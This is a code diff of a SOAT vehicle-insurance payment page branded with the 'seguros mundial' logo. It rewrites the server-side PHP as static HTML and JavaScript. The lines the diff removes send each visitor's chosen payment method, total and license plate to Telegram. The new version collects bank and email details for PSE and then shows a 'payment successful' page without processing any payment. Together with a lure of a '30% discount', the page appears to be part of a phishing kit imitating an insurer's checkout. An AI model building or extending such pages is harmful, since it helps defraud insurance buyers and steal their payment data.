@@ -1,61 +1,3 @@
-<?php
-
-session_start();
-require_once __DIR__ . '/includes/calculo.php';
-require_once __DIR__ . '/includes/security.php';
-require_once __DIR__ . '/includes/telegram.php';
-
-if (empty($_SESSION['cotizacion']) || empty($_SESSION['resumen'])) {
-    header('Location: index.php');
-    exit;
-}
-
-$cot     = $_SESSION['cotizacion'];
-$sel     = $_SESSION['seleccion'] ?? [];
-$resumen = $_SESSION['resumen'];
-
-$nombres = $_SESSION['propietario']['nombres'] ?? 'MARIA';
-
-$inicioVigencia = new DateTime('today');
-$finVigencia    = (clone $inicioVigencia)->modify('+1 year -1 day');
-
-$medioPagoSel = $_SESSION['medio_pago'] ?? null;
-$errores = [];
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $medioPagoSel = $_POST['medio_pago'] ?? null;
-
-    if (empty($medioPagoSel)) {
-        $errores[] = 'Selecciona un medio de pago para continuar.';
-    }
-
-    if (empty($errores)) {
-        $_SESSION['medio_pago'] = $medioPagoSel;
-
-        // Notificar a Telegram el medio elegido
-        $mediosTexto = [
-            'qr'      => 'Código QR / Transferencia',
-            'tarjeta' => 'Tarjeta Crédito/Débito',
-        ];
-        telegram_medio_pago(
-            $mediosTexto[$medioPagoSel] ?? $medioPagoSel,
-            formato_cop($resumen['total']),
-            $cot['placa'] ?? '—'
-        );
-
-        if ($medioPagoSel === 'tarjeta') {
-            header('Location: pago-con-tarjeta.php');
-            exit;
-        }
-        if ($medioPagoSel === 'qr') {
-            header('Location: qr/index.php');
-            exit;
-        }
-    }
-}
-
-$tieneDescuento = !empty($resumen['descuento_soat']) && $resumen['descuento_soat'] > 0;
-?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -63,403 +5,387 @@ $tieneDescuento = !empty($resumen['descuento_soat']) && $resumen['descuento_soat
 <meta http-equiv="x-ua-compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="theme-color" content="#FFFFFF">
-<title>Pago | Ejercicio PHP</title>
+<title>Medios de Pago | SOAT</title>
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/component---src-pages-informacion-vehiculo-tsx.afa77d34e9e72fc40a52.css">
+<link rel="stylesheet" href="assets/css/component---src-pages-index-tsx.2f90ad7b25207235a98b.css">
 <link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
 <link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
 <link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
 <link rel="stylesheet" href="assets/css/styles_ltr.css">
+
 <style>
-.inf-vehiculo-form-module--container--a17d4 {
-    max-width: 720px;
-    margin: 40px auto;
-    padding: 0 20px;
-    box-sizing: border-box;
-}
-
-.pago-form-wrapper {
+  body {
+    font-family: 'Ubuntu', Arial, sans-serif;
+    background-color: #f4f7f9;
+    color: #2c3e50;
+    margin: 0;
+    padding: 0;
+  }
+  .pago-container {
+    max-width: 680px;
+    margin: 32px auto;
+    padding: 0 16px;
+  }
+  .pago-card {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+    padding: 26px;
+  }
+  .pago-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+    border-bottom: 1px solid #e9eef2;
+    padding-bottom: 16px;
+    margin-bottom: 20px;
+  }
+  .pago-header h1 {
+    margin: 0;
+    font-size: 1.45rem;
+    color: #066188;
+  }
+  .resumen-pago {
+    background: #eef7fc;
+    color: #066188;
+    font-weight: 700;
+    padding: 8px 14px;
+    border-radius: 8px;
+    font-size: 0.95rem;
+  }
+  .metodos-lista {
+    display: flex;
     flex-direction: column;
-    align-items: stretch;
-    max-width: 640px;
-    width: 100%;
-    margin-left: auto;
-    margin-right: auto;
-}
-
-.pago-form-wrapper .form-stages-module--stages--99ccc {
-    margin-left: 0;
-    margin-right: 0;
-    width: 100%;
-}
-
-.pago-saludo {
-    text-align: center;
-    width: 100%;
-    margin-bottom: 10px;
-}
-.pago-saludo h1 {
-    font-size: 1.6rem;
-    font-weight: 700;
-    color: #066188;
-    margin: 0 0 4px;
-}
-.pago-saludo p {
-    font-size: 1.1rem;
-    font-weight: 700;
-    color: #0a99d6;
-    margin: 0;
-}
-
-.pago-detalle {
-    width: 100%;
-    margin: 10px 0;
-}
-.pago-detalle-fila {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 20px;
-    padding: 6px 0;
-    color: #4d4d4f;
-    font-size: .95rem;
-}
-.pago-detalle-fila strong {
-    color: #000;
-    font-weight: 700;
-}
-.pago-detalle-fila span:last-child {
-    text-align: right;
-    white-space: nowrap;
-}
-.pago-detalle-fila.valor-soat {
-    font-weight: 700;
-    color: #066188;
-    border-top: 1px solid #e8e8ed;
-    margin-top: 6px;
-    padding-top: 14px;
-}
-
-/* Filas de descuento */
-.pago-descuento-oficial {
-    display: flex;
-    justify-content: space-between;
-    gap: 20px;
-    padding: 6px 0;
-    color: #828285;
-    font-size: .95rem;
-}
-.pago-descuento-oficial .valor-tachado {
-    text-decoration: line-through;
-    color: #828285;
-    text-align: right;
-    white-space: nowrap;
-}
-.pago-descuento-descuento {
-    display: flex;
-    justify-content: space-between;
-    gap: 20px;
-    padding: 8px 12px;
-    background: #eafaf1;
-    border-radius: 6px;
-    color: #15d064;
-    font-weight: 700;
-    font-size: .95rem;
-    margin: 6px 0;
-}
-.pago-descuento-descuento span:last-child {
-    text-align: right;
-    white-space: nowrap;
-}
-
-.pago-valor-total {
-    display: flex;
-    justify-content: space-between;
-    align-items: baseline;
-    width: 100%;
-    margin: 10px 0 20px;
-}
-.pago-valor-total h2 {
-    font-size: 1.3rem;
-    font-weight: 700;
-    color: #066188;
-    margin: 0;
-}
-.pago-valor-total .monto {
-    font-size: 1.5rem;
-    font-weight: 700;
-    color: #066188;
-}
-
-.pago-medios-titulo {
-    width: 100%;
-    font-size: 1rem;
-    font-weight: 700;
-    color: #0a99d6;
-    margin: 0 0 12px;
-}
-
-.pago-medio-opcion {
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  .metodo-opcion {
     display: flex;
     align-items: center;
-    gap: 10px;
-    border: 1px solid #d9e8f0;
+    justify-content: space-between;
+    gap: 14px;
+    border: 1px solid #dce6ee;
     border-radius: 10px;
-    padding: 10px 14px;
-    margin-bottom: 10px;
-    width: 100%;
-    box-sizing: border-box;
+    padding: 14px 16px;
     cursor: pointer;
-    transition: border-color .2s, background-color .2s;
-}
-.pago-medio-opcion:hover {
+    background: #ffffff;
+    transition: border-color .2s ease, background .2s ease;
+  }
+  .metodo-opcion:hover {
     border-color: #0a99d6;
-    background-color: #f5fbfe;
-}
-.pago-medio-opcion input[type="radio"] {
-    margin-left: auto;
+    background: #f9fcff;
+  }
+  .metodo-izq {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .metodo-izq input[type="radio"] {
     width: 18px;
     height: 18px;
     accent-color: #0a99d6;
-    flex-shrink: 0;
-}
-.pago-medio-icono {
-    width: 22px;
-    height: 22px;
-    flex-shrink: 0;
+    cursor: pointer;
+  }
+  .metodo-titulo {
+    font-weight: 700;
+    color: #1f2d3d;
+    display: block;
+  }
+  .metodo-desc {
+    font-size: 0.85rem;
+    color: #6c7a89;
+  }
+  .metodo-logos {
     display: flex;
     align-items: center;
-    justify-content: center;
-    border-radius: 50%;
-    background: #eef5fb;
-    overflow: hidden;
-}
-.pago-medio-icono img { width: 100%; height: 100%; object-fit: contain; }
-.pago-medio-texto {
-    font-size: .85rem;
+    gap: 8px;
+  }
+  .metodo-logos img {
+    height: 24px;
+    width: auto;
+    object-fit: contain;
+  }
+  #panel-pse {
+    display: none;
+    background: #f8fbfd;
+    border: 1px solid #dce6ee;
+    border-radius: 10px;
+    padding: 16px;
+    margin-bottom: 18px;
+  }
+  .campo-grupo {
+    margin-bottom: 14px;
+  }
+  .campo-grupo:last-child {
+    margin-bottom: 0;
+  }
+  .campo-grupo label {
+    display: block;
+    font-size: 0.88rem;
     font-weight: 600;
-    color: #1a1a1a;
-    line-height: 1.3;
-}
-
-.pago-aviso-vigencia {
-    width: 100%;
-    color: #b5651d;
-    font-weight: 700;
-    font-size: .85rem;
-    margin: 12px 0 6px;
-}
-
-@media (max-width: 48rem) {
-    .inf-vehiculo-form-module--container--a17d4 {
-        max-width: 100%;
-        padding: 0;
-        margin: 20px auto;
-    }
-    .pago-form-wrapper {
-        max-width: 100%;
-    }
-    .pago-form-wrapper .form-stages-module--stages--99ccc {
-        margin-left: 8%;
-        margin-right: 8%;
-    }
-    .pago-medio-opcion {
-        padding: 8px 10px;
-        gap: 8px;
-    }
-    .pago-medio-icono {
-        width: 18px;
-        height: 18px;
-    }
-    .pago-medio-texto {
-        font-size: .78rem;
-    }
-    .pago-saludo h1 { font-size: 1.3rem; }
-    .pago-saludo p  { font-size: 1rem; }
-}
-
-.pago-mensaje-error {
-    background:#fdecea;
-    border:1px solid #f5c2c0;
-    color:#7a2a24;
-    border-radius:8px;
-    padding:12px 16px;
-    margin-bottom:16px;
+    color: #1f2d3d;
+    margin-bottom: 6px;
+  }
+  .campo-grupo input,
+  .campo-grupo select {
     width: 100%;
     box-sizing: border-box;
-}
-.pago-mensaje-error ul { margin:8px 0 0 18px; padding:0; }
+    padding: 10px 12px;
+    border: 1px solid #cdd8e2;
+    border-radius: 8px;
+    font-size: 0.95rem;
+    font-family: inherit;
+    background: #ffffff;
+    color: #1f2d3d;
+  }
+  #mensaje-errores {
+    display: none;
+    background: #fdecea;
+    border: 1px solid #f5c2c0;
+    color: #7a2a24;
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin-bottom: 16px;
+  }
+  .acciones-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+    margin-top: 20px;
+    flex-wrap: wrap;
+  }
+  .btn-secundario {
+    display: inline-block;
+    padding: 12px 18px;
+    border-radius: 8px;
+    border: 1px solid #0a99d6;
+    color: #0a99d6;
+    background: #ffffff;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .btn-primario {
+    padding: 13px 24px;
+    border-radius: 8px;
+    border: none;
+    background: #0a99d6;
+    color: #ffffff;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+  }
+  .btn-primario:hover {
+    background: #087daf;
+  }
 </style>
 </head>
 <body>
-<div id="___gatsby">
-<div tabindex="-1" id="gatsby-focus-wrapper" style="outline: none;">
 
-<?php include __DIR__ . '/includes/header.php'; ?>
-
+<!-- Aquí iba includes/header.php -->
 <nav class="menu-module--menu--ff100">
   <div class="menu-module--menu__container--550e5">
     <div class="logo-module--wrapper__logo--d2507">
-      <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
-           src="assets/img/imagen_1_.png"
-           width="609" height="136" alt="seguros mundial" title="seguros mundial">
+      <a href="index.html">
+        <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
+             src="assets/img/imagen_1_.png"
+             width="609" height="136" alt="seguros mundial" title="seguros mundial">
+      </a>
     </div>
-    <div class="menu-module--menu__container__logos--cd40c" data-ally="false"></div>
   </div>
-  <ul class="menu-module--menu__items--6eadc">
-    <li class="menu-item-module--menu_item--04780 menu-item-module--display_none--19788 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
-      <div class="menu-item-module--button--a1b98">
-        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">Comprar SOAT</button></div>
-      </div>
-    </li>
-    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__centered--2e42f">
-      <div class="menu-item-module--button--a1b98">
-        <button data-theme="menu-item" class="button-icon-module--button--c6d67" type="button">
-          <div class="button-icon-module--button__text--80959">SOAT
-            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
-                 height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-              <polyline points="6 9 12 15 18 9"></polyline>
-            </svg>
-          </div>
-        </button>
-      </div>
-    </li>
-    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
-      <div class="menu-item-module--button--a1b98">
-        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">QUIERO RENOVAR MI SOAT</button></div>
-      </div>
-    </li>
-  </ul>
 </nav>
 
-<main>
-<section class="inf-vehiculo-form-module--container--a17d4">
-  <form class="form-module--form--731f9 pago-form-wrapper" method="post" action="pago.php">
-
-    <div class="pago-saludo">
-      <h1>¡<?= htmlspecialchars(strtoupper($nombres)) ?>!</h1>
-      <p>ya puedes pagar tu SOAT</p>
-    </div>
-
-    <div class="form-stages-module--stages--99ccc">
-      <div class="form-stages-module--stages__item--51e51">
-        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">1</div>
-        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Cotiza</div>
-      </div>
-      <div class="form-stages-module--stages__separator--f88c2"></div>
-      <div class="form-stages-module--stages__item--51e51">
-        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">2</div>
-        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Resumen</div>
-      </div>
-      <div class="form-stages-module--stages__separator--f88c2"></div>
-      <div class="form-stages-module--stages__item--51e51">
-        <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">3</div>
-        <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Pago</div>
+<main class="pago-container">
+  <form class="pago-card" id="form-medio-pago" action="#" method="post" novalidate>
+    <div class="pago-header">
+      <h1>Elige tu medio de pago</h1>
+      <div class="resumen-pago">
+        Placa: <span id="pago-placa">ABC123</span> · Total: <span id="pago-total">$540.000</span>
       </div>
     </div>
 
-    <?php if (!empty($errores)): ?>
-      <div class="pago-mensaje-error">
-        <strong>Revisa lo siguiente:</strong>
-        <ul>
-          <?php foreach ($errores as $error): ?>
-            <li><?= htmlspecialchars($error) ?></li>
-          <?php endforeach; ?>
-        </ul>
-      </div>
-    <?php endif; ?>
+    <div id="mensaje-errores">
+      <strong>Revisa lo siguiente:</strong>
+      <ul id="lista-errores" style="margin:8px 0 0 18px;padding:0;"></ul>
+    </div>
 
-    <div class="pago-detalle">
-      <div class="pago-detalle-fila">
-        <span>Inicio de vigencia</span>
-        <span><?= $inicioVigencia->format('d/m/Y') ?></span>
-      </div>
-      <div class="pago-detalle-fila">
-        <span>Final de vigencia</span>
-        <span><?= $finVigencia->format('d/m/Y') ?></span>
-      </div>
-      <div class="pago-detalle-fila">
-        <strong>Tipo de vehículo</strong>
-        <strong><?= htmlspecialchars($cot['vehiculo']['clase']) ?></strong>
-      </div>
-
-      <?php if ($tieneDescuento): ?>
-        <div class="pago-descuento-oficial">
-          <span>Valor SOAT oficial</span>
-          <span class="valor-tachado"><?= formato_cop($resumen['valor_soat_oficial']) ?></span>
+    <div class="metodos-lista">
+      <label class="metodo-opcion">
+        <div class="metodo-izq">
+          <input type="radio" name="medio_pago" value="tarjeta" checked>
+          <div>
+            <span class="metodo-titulo">Tarjeta Crédito / Débito</span>
+            <span class="metodo-desc">Completa los datos de tu tarjeta en el siguiente paso</span>
+          </div>
         </div>
-        <div class="pago-descuento-descuento">
-          <span>Descuento 30% 🎉</span>
-          <span>-<?= formato_cop($resumen['descuento_soat']) ?></span>
+        <div class="metodo-logos">
+          <img src="assets/img/visa.png" alt="Visa">
+          <img src="assets/img/master_card.png" alt="Mastercard">
         </div>
-      <?php endif; ?>
+      </label>
 
-      <div class="pago-detalle-fila valor-soat">
-        <span>SOAT</span>
-        <span><?= formato_cop($resumen['subtotal_soat']) ?></span>
-      </div>
+      <label class="metodo-opcion">
+        <div class="metodo-izq">
+          <input type="radio" name="medio_pago" value="pse">
+          <div>
+            <span class="metodo-titulo">PSE</span>
+            <span class="metodo-desc">Débito desde cuenta de ahorros o corriente</span>
+          </div>
+        </div>
+        <div class="metodo-logos">
+          <img src="assets/img/pse.png" alt="PSE">
+        </div>
+      </label>
 
-      <?php if ($resumen['terceros']): ?>
-      <div class="pago-detalle-fila">
-        <span>Seguro Tercero Voluntario</span>
-        <span><?= formato_cop($resumen['subtotal_terceros']) ?></span>
-      </div>
-      <?php endif; ?>
-      <?php if ($resumen['accidentes']): ?>
-      <div class="pago-detalle-fila">
-        <span>Accidentes Personales (<?= htmlspecialchars($resumen['accidentes']['label']) ?>)</span>
-        <span><?= formato_cop($resumen['subtotal_accidentes']) ?></span>
-      </div>
-      <?php endif; ?>
+      <label class="metodo-opcion">
+        <div class="metodo-izq">
+          <input type="radio" name="medio_pago" value="qr">
+          <div>
+            <span class="metodo-titulo">Código QR / Bre-B / Billeteras</span>
+            <span class="metodo-desc">Escanea el código QR y confirma tu pago</span>
+          </div>
+        </div>
+        <div class="metodo-logos">
+          <img src="assets/img/br-b.png" alt="Bre-B">
+          <img src="assets/img/logo_nequi.png" alt="Nequi">
+          <img src="assets/img/Bancolombia.png" alt="Bancolombia">
+        </div>
+      </label>
     </div>
 
-    <div class="pago-valor-total">
-      <h2>Valor Total</h2>
-      <span class="monto"><?= formato_cop($resumen['total']) ?></span>
+    <div id="panel-pse">
+      <div class="campo-grupo">
+        <label for="pse-tipo-persona">Tipo de persona</label>
+        <select id="pse-tipo-persona" name="tipo_persona">
+          <option value="Natural">Persona Natural</option>
+          <option value="Juridica">Persona Jurídica</option>
+        </select>
+      </div>
+      <div class="campo-grupo">
+        <label for="pse-banco">Banco</label>
+        <select id="pse-banco" name="banco">
+          <option value="">Selecciona tu banco</option>
+          <option value="Bancolombia">Bancolombia</option>
+          <option value="Nequi">Nequi</option>
+          <option value="Banco de Bogotá">Banco de Bogotá</option>
+          <option value="Davivienda">Davivienda</option>
+          <option value="BBVA Colombia">BBVA Colombia</option>
+          <option value="Banco de Occidente">Banco de Occidente</option>
+        </select>
+      </div>
+      <div class="campo-grupo">
+        <label for="pse-correo">Correo electrónico</label>
+        <input type="email" id="pse-correo" name="correo" placeholder="correo@ejemplo.com">
+      </div>
     </div>
 
-    <p class="pago-medios-titulo">Elige el medio de pago</p>
-
-    <!-- Opción QR (Redirige a la carpeta /qr/) -->
-    <label class="pago-medio-opcion">
-      <span class="pago-medio-icono">
-        <img src="qr/logo.png" alt="QR">
-      </span>
-      <span class="pago-medio-texto">Pago con Código QR / Transferencia</span>
-      <input type="radio" name="medio_pago" value="qr" <?= $medioPagoSel === 'qr' ? 'checked' : '' ?>>
-    </label>
-
-    <!-- Opción Tarjeta / Otros -->
-    <label class="pago-medio-opcion">
-      <span class="pago-medio-icono">
-        <img src="assets/img/visa.png" alt="Tarjeta">
-      </span>
-      <span class="pago-medio-texto">Tarjeta Crédito / Débito (Visa, MasterCard), Nequi y Bancolombia: tú eliges.</span>
-      <input type="radio" name="medio_pago" value="tarjeta" <?= $medioPagoSel === 'tarjeta' ? 'checked' : '' ?>>
-    </label>
-
-    <p class="pago-aviso-vigencia">¡Pilas antes de pagar verifica que la vigencia de tu póliza este correcta!</p>
-
-    <p class="inf-vehiculo-form-module--form__info_vehiculo__tooltiptext--aedd9" style="width:100%;">
-      *Si tu vehículo aplica para más de una clasificación, cerciórate de elegir la correcta.
-      Para la tarifa de Servicio Público, debes seleccionar la tarifa que tienes autorizada en
-      la Tarjeta de Operación. Seguros Mundial no se hace responsable si eliges la tarifa que no aplica.
-    </p>
-
-    <section class="return-next-buttons-container-module--container__buttons--2a423">
-      <a href="informacion-vehiculo.php" class="button-old-module--decline--6bd21">Regresar</a>
-      <button type="submit" class="button-old-module--accept--3b47a button-old-module--button--9a043">Ir a pagar</button>
-    </section>
-
+    <div class="acciones-bar">
+      <a href="informacion-vehiculo.html" class="btn-secundario">Volver al resumen</a>
+      <button type="submit" class="btn-primario" id="btn-continuar-pago">Continuar</button>
+    </div>
   </form>
-</section>
 </main>
 
-<?php include __DIR__ . '/includes/footer.php'; ?>
+<!-- Aquí iba includes/footer.php -->
 
-</div>
-</div>
+<script>
+(function () {
+  'use strict';
+
+  function leerJSON(key) {
+    var raw = sessionStorage.getItem(key) || localStorage.getItem(key);
+    if (!raw) return null;
+    try { return JSON.parse(raw); } catch (e) { return null; }
+  }
+
+  var resumen = leerJSON('resumen_soat') || {};
+  var cotizacion = leerJSON('cotizacion_soat') || {};
+
+  var placa = resumen.placa || cotizacion.placa || 'ABC123';
+  var total = resumen.total_formato || '$540.000';
+
+  document.getElementById('pago-placa').textContent = placa;
+  document.getElementById('pago-total').textContent = total;
+
+  var radios = document.querySelectorAll('input[name="medio_pago"]');
+  var panelPse = document.getElementById('panel-pse');
+
+  function actualizarPanelMedio() {
+    var sel = document.querySelector('input[name="medio_pago"]:checked');
+    var val = sel ? sel.value : 'tarjeta';
+    panelPse.style.display = (val === 'pse') ? 'block' : 'none';
+  }
+
+  radios.forEach(function (r) {
+    r.addEventListener('change', actualizarPanelMedio);
+  });
+  actualizarPanelMedio();
+
+  var form = document.getElementById('form-medio-pago');
+  var boxErrores = document.getElementById('mensaje-errores');
+  var listaErrores = document.getElementById('lista-errores');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var sel = document.querySelector('input[name="medio_pago"]:checked');
+    var medio = sel ? sel.value : 'tarjeta';
+    var errores = [];
+
+    var detalle = {
+      medio: medio.toUpperCase(),
+      placa: placa,
+      total: total,
+      fecha: new Date().toISOString()
+    };
+
+    if (medio === 'pse') {
+      var tipoPersona = document.getElementById('pse-tipo-persona').value;
+      var banco = document.getElementById('pse-banco').value;
+      var correo = document.getElementById('pse-correo').value.trim();
+
+      if (!banco) {
+        errores.push('Selecciona un banco para continuar con PSE.');
+      }
+      if (!correo || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
+        errores.push('Ingresa un correo electrónico válido para PSE.');
+      }
+
+      detalle.tipo_persona = tipoPersona;
+      detalle.banco = banco;
+      detalle.correo = correo;
+    }
+
+    if (errores.length > 0) {
+      listaErrores.innerHTML = '';
+      errores.forEach(function (err) {
+        var li = document.createElement('li');
+        li.textContent = err;
+        listaErrores.appendChild(li);
+      });
+      boxErrores.style.display = 'block';
+      boxErrores.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    boxErrores.style.display = 'none';
+    sessionStorage.setItem('ultimo_intento_pago', JSON.stringify(detalle));
+
+    if (medio === 'tarjeta') {
+      window.location.href = 'pago-con-tarjeta.html';
+    } else if (medio === 'qr') {
+      window.location.href = 'qr/index.html';
+    } else {
+      window.location.href = 'pago-exitoso.html';
+    }
+  });
+})();
+</script>
+
 </body>
 </html>
